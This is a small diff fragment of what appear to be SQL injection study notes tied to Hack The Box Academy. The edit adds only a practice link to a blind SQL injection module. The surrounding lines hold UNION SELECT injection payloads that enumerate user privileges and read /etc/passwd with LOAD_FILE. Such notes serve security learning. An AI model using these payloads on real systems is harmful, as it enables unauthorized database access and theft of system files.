@@ -131,3 +131,7 @@ cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_priv
 SELECT LOAD_FILE
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 ```
+
+
+# Practice 
+[Blind SQL Injection](https://academy.hackthebox.com/app/module/177)
